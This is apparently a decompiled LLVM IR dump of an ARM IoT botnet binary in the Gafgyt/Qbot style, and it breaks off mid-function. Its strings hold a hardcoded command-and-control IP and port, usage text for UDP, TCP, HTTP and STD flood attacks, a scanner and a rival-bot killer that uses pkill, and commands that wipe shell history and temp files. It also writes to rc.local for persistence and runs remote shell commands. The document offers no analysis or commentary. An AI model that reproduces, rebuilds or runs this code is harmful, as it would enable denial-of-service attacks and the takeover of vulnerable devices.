@global_var_1f7c4.574 = constant [4 x i8] c"ack\00"
@global_var_1f7c8.576 = constant [4 x i8] c"psh\00"
@global_var_1f7cc.578 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1f7e0.580 = constant [10 x i8] c"pkill -9 \00"
@global_var_1e018.582 = constant [5 x i8] c"mips\00"
@global_var_1e020.583 = constant [7 x i8] c"mipsel\00"
@global_var_1e028.584 = constant [4 x i8] c"sh4\00"
@global_var_1e02c.585 = constant [4 x i8] c"x86\00"
@global_var_1e030.586 = constant [5 x i8] c"i686\00"
@global_var_1e038.587 = constant [4 x i8] c"ppc\00"
@global_var_1e03c.588 = constant [5 x i8] c"i586\00"
@global_var_1e044.589 = constant [8 x i8] c"jackmy*\00"
@global_var_1e04c.590 = constant [8 x i8] c"hackmy*\00"
@global_var_1e054.591 = constant [5 x i8] c"arm*\00"
@global_var_1e05c.592 = constant [3 x i8] c"b1\00"
@global_var_1e060.593 = constant [3 x i8] c"b2\00"
@global_var_1e064.594 = constant [3 x i8] c"b3\00"
@global_var_1e068.595 = constant [3 x i8] c"b4\00"
@global_var_1e06c.596 = constant [3 x i8] c"b5\00"
@global_var_1e070.597 = constant [3 x i8] c"b6\00"
@global_var_1e074.598 = constant [3 x i8] c"b7\00"
@global_var_1e078.599 = constant [3 x i8] c"b8\00"
@global_var_1e07c.600 = constant [3 x i8] c"b9\00"
@global_var_1e080.601 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1e094.602 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1e0a0.603 = constant [10 x i8] c"dvrHelper\00"
@global_var_1e0ac.604 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1e0b4.605 = constant [5 x i8] c"FEUB\00"
@global_var_1e0bc.606 = constant [9 x i8] c"FTUdftui\00"
@global_var_1e0c8.607 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1e0d4.608 = constant [6 x i8] c"jhUOH\00"
@global_var_1e0dc.609 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1e0e8.610 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1e0f4.611 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1e100.612 = constant [10 x i8] c"lolmipsel\00"
@global_var_1e10c.613 = constant [8 x i8] c"RYrydry\00"
@global_var_1e114.614 = constant [5 x i8] c"tel*\00"
@global_var_1e11c.615 = constant [9 x i8] c"TwoFace*\00"
@global_var_1e128.616 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1e134.617 = constant [5 x i8] c"wget\00"
@global_var_1e13c.618 = constant [7 x i8] c"x86_64\00"
@global_var_1e144.619 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1e150.620 = constant [5 x i8] c"xxb*\00"
@global_var_1e15c.621 = constant i32 49
@global_var_1e160.622 = constant i32 50
@global_var_1e164.623 = constant i32 51
@global_var_1e168.624 = constant i32 52
@global_var_1e16c.625 = constant i32 53
@global_var_1e170.626 = constant i32 54
@global_var_1e174.627 = constant i32 55
@global_var_1e178.628 = constant i32 56
@global_var_1e17c.629 = constant i32 57
@global_var_1e180.630 = constant [3 x i8] c"10\00"
@global_var_1e184.631 = constant [3 x i8] c"11\00"
@global_var_1e188.632 = constant [3 x i8] c"12\00"
@global_var_1e18c.633 = constant [3 x i8] c"13\00"
@global_var_1e190.634 = constant [3 x i8] c"14\00"
@global_var_1e194.635 = constant [3 x i8] c"15\00"
@global_var_1e198.636 = constant [3 x i8] c"16\00"
@global_var_1e19c.637 = constant [3 x i8] c"17\00"
@global_var_1e1a0.638 = constant [3 x i8] c"18\00"
@global_var_1e1a4.639 = constant [3 x i8] c"19\00"
@global_var_1e1a8.640 = constant [3 x i8] c"20\00"
@global_var_1e1ac.641 = constant [6 x i8] c"hackz\00"
@global_var_1e1b4.642 = constant [5 x i8] c"bin*\00"
@global_var_1e1bc.643 = constant [5 x i8] c"gtop\00"
@global_var_1e1c4.644 = constant [5 x i8] c"ftp*\00"
@global_var_1e1cc.645 = constant [6 x i8] c"tftp*\00"
@global_var_1e1d4.646 = constant [7 x i8] c"botnet\00"
@global_var_1e1dc.647 = constant [8 x i8] c"swatnet\00"
@global_var_1e1e4.648 = constant [8 x i8] c"ballpit\00"
@global_var_1e1ec.649 = constant [8 x i8] c"fucknet\00"
@global_var_1e1f4.650 = constant [9 x i8] c"cracknet\00"
@global_var_1e200.651 = constant [8 x i8] c"weednet\00"
@global_var_1e208.652 = constant [7 x i8] c"gaynet\00"
@global_var_1e210.653 = constant [9 x i8] c"queernet\00"
@global_var_1e21c.654 = constant [8 x i8] c"ballnet\00"
@global_var_1e224.655 = constant [5 x i8] c"unet\00"
@global_var_1e22c.656 = constant [7 x i8] c"yougay\00"
@global_var_1e234.657 = constant [7 x i8] c"sttftp\00"
@global_var_1e23c.658 = constant [7 x i8] c"sstftp\00"
@global_var_1e244.659 = constant [7 x i8] c"sbtftp\00"
@global_var_1e24c.660 = constant [6 x i8] c"btftp\00"
@global_var_1e254.661 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1e260.662 = constant [6 x i8] c"bruv*\00"
@global_var_1e268.663 = constant [5 x i8] c"IoT*\00"
@global_var_1e270.664 = constant [19 x i8] c"159.89.176.175:114\00"
@global_var_294fc.665 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e018.582, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e020.583, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e028.584, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e02c.585, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e030.586, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e038.587, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e03c.588, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e03c.588, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e044.589, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e04c.590, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e054.591, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e05c.592, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e060.593, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e064.594, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e068.595, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e06c.596, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e070.597, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e074.598, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e078.599, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e07c.600, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1e080.601, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e094.602, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e0a0.603, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e0ac.604, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e0b4.605, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e0bc.606, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e0c8.607, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e0d4.608, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e0dc.609, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e0e8.610, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e0f4.611, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e100.612, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e018.582, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e020.583, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e10c.613, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e114.614, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e11c.615, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e128.616, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e134.617, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e13c.618, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e144.619, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e150.620, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e158.36, i32 0, i32 0), i8* bitcast (i32* @global_var_1e15c.621 to i8*), i8* bitcast (i32* @global_var_1e160.622 to i8*), i8* bitcast (i32* @global_var_1e164.623 to i8*), i8* bitcast (i32* @global_var_1e168.624 to i8*), i8* bitcast (i32* @global_var_1e16c.625 to i8*), i8* bitcast (i32* @global_var_1e170.626 to i8*), i8* bitcast (i32* @global_var_1e174.627 to i8*), i8* bitcast (i32* @global_var_1e178.628 to i8*), i8* bitcast (i32* @global_var_1e17c.629 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e180.630, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e184.631, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e188.632, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e18c.633, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e190.634, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e194.635, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e198.636, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e19c.637, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e1a0.638, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e1a4.639, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e1a8.640, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e1ac.641, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e1b4.642, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e1bc.643, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e1c4.644, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e1cc.645, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e1d4.646, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e1dc.647, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e1e4.648, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e1ec.649, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e1f4.650, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e200.651, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e208.652, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e210.653, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e21c.654, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e224.655, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e22c.656, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e234.657, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e23c.658, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e244.659, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e24c.660, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e254.661, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e260.662, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e268.663, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1e270.664, i32 0, i32 0)]
@global_var_1f7ec.667 = constant [11 x i8] c"pkill -9 \22\00"
@global_var_1f7f8.669 = constant i32 34
@global_var_1f7fc.671 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1f814.673 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_1f834.675 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1f874.677 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1f8b4.678 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1f8f4.679 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1f984.680 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1f9bc.681 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1f9dc.682 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1f9f4.683 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1f84c.692 = constant [6 x i8] c"close\00"
@global_var_1f854.693 = constant [11 x i8] c"keep-alive\00"
@global_var_1f860.694 = constant [7 x i8] c"accept\00"
@global_var_1f868.695 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f84c.692, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f854.693, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f860.694, i32 0, i32 0)]
@global_var_1fa68.701 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_1faa8.705 = constant [6 x i8] c"PONG!\00"
@global_var_1fab0.707 = constant [6 x i8] c"TABLE\00"
@global_var_1fab8.709 = constant [3 x i8] c"%d\00"
@global_var_1fabc.711 = constant [8 x i8] c"SCANNER\00"
@global_var_1fac4.713 = constant [4 x i8] c"OFF\00"
@global_var_2fc04.715 = global i32 0
@global_var_1fac8.717 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_1fadc.719 = constant [3 x i8] c"ON\00"
@global_var_1fae0.722 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_1fafc.724 = constant [8 x i8] c"REMOVER\00"
@global_var_1fb04.726 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_1fb24.728 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_1fb30.730 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_1fb44.732 = constant [4 x i8] c"UDP\00"
@global_var_1fb48.734 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1fbbc.737 = constant [4 x i8] c"TCP\00"
@global_var_1fbc0.739 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1fc7c.741 = constant [5 x i8] c"HTTP\00"
@global_var_1fc84.743 = constant [4 x i8] c"STD\00"
@global_var_1fc88.745 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1fca4.747 = constant [9 x i8] c"KILLATTK\00"
@global_var_1fcb0.751 = constant [11 x i8] c"Killed %d.\00"
@global_var_1fcbc.753 = constant [13 x i8] c"None Killed.\00"
@global_var_1fccc.755 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_29658.758 = local_unnamed_addr global i32 -1
@global_var_29654.760 = global [19 x i8]* @global_var_1e270.664
@global_var_1fcd8.762 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1fce0.765 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1fcf0.767 = constant [11 x i8] c"\0900000000\09\00"
@global_var_299b0.769 = global i32 0
@global_var_1fcfc.771 = constant [6 x i8] c"ROOTS\00"
@global_var_1fd04.773 = constant i32 0
@global_var_1fd08.775 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_1fd20.779 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1fd30.781 = constant i32 47
@global_var_1fd34.783 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1fd3c.785 = constant i32 97
@global_var_1fd40.787 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1fd50.791 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_1fd5c.796 = constant [5 x i8] c"PONG\00"
@global_var_1fd64.798 = constant [4 x i8] c"DUP\00"
@global_var_1fd68.800 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_1fd7c.802 = constant [3 x i8] c"SH\00"
@global_var_1fd80.804 = constant [8 x i8] c"%s 2>&1\00"
@global_var_1fd88.806 = constant [3 x i8] c"%s\00"
@global_var_1fd8c.808 = constant i32 32
@global_var_2947c.811 = global i32 0
@global_var_16718.819 = constant i32 167772232
@global_var_14854.823 = constant i32 -382906384
@global_var_168b4.827 = constant i32 -382909968
@global_var_20003.833 = constant i32 0
@global_var_20000.834 = constant i32 0
@global_var_132a0.844 = constant i32 -509607926
@global_var_13470.854 = constant i32 -382910448
@global_var_19000.855 = constant i32 -382909968
@global_var_190b4.856 = constant i32 -382910224
@global_var_14f9c.882 = constant i32 167772168
@global_var_145c4.891 = constant i32 -509607928
@global_var_14c6c.918 = constant i32 -456978431
@global_var_159d8.953 = constant i32 -478871519
@global_var_16324.962 = constant i32 -478805983
@global_var_16700.971 = constant i32 -382906384
@global_var_12c30.980 = constant i32 -509591552
@global_var_16cc0.986 = constant i32 -442564540
@global_var_1f31d.1016 = constant [13 x i8] c"08.248.%d.%d\00"
@global_var_17568.1030 = constant i32 -494075872
@global_var_12c5c.1031 = constant i32 -382910336
@global_var_17728.1043 = constant i32 -369098421
@global_var_16b30.1063 = constant i32 -442543860
@global_var_14d20.1072 = constant i32 -369093530
@global_var_181f0.1085 = constant i32 -335545191
@global_var_187b0.1100 = constant i32 -443088884
@global_var_1afa4.1149 = constant i32 -382909456
@global_var_12c94.1172 = constant i32 -382910336
@global_var_1c408.1177 = constant i32 -442695584
@global_var_1c9d0.1186 = constant i32 -382910224
@global_var_1d824.1212 = constant i32 -504313148
@global_var_1d80c.1213 = constant i32 -483131392
@global_var_1d6b8.1214 = constant i32 -481229311
@global_var_1d894.1215 = constant i32 -477817729
@global_var_1d994.1216 = constant i32 -476034303
@global_var_1dbd0.1217 = constant i32 -516685812
@global_var_1dac4.1218 = constant i32 -905969571
@global_var_1d9f8.1219 = constant i32 -528203771
@global_var_1dc58.1220 = constant i32 -478079873
@global_var_1dc3c.1221 = constant i32 -534704125
@global_var_1dbec.1222 = constant i32 -534704125
@global_var_1db84.1223 = constant i32 -483131392
@global_var_29980.3 = external global i8*
@global_var_299b9.78 = local_unnamed_addr global i8 0
@global_var_299ba.79 = local_unnamed_addr global i8 0
@global_var_1fd1c.777 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_29980.3 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_29980.3 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_29980.3, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_29478.13, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_29478.13 to i32)

; uselistorder directives
  uselistorder i32* @global_var_29478.13, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_118a4.17 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 122888, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_299bc.20, align 4
  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_299c0.21, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_299c4.22, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_299bc.20 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_299bc.20 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_299bc.20 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_29720.25, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_29720.25, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_299bc.20 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
